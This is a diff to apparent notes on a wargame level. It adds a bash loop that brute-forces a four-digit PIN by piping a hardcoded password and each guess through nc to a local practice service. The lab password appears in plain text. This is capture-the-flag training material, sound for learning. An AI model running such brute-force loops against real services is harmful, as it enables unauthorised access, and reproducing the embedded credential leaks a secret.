@@ -147,4 +147,11 @@ vim script.sh; chmod +x !$; chmod 777 !$
       echo $bandit24_pass $i | nc localhost 30002 >> data
    fi
   done
+# variant :
+  #!/bin/bash
+  for i in {9999..0000};
+  do
+    echo "try $i"
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002;
+  done
 ./script.sh
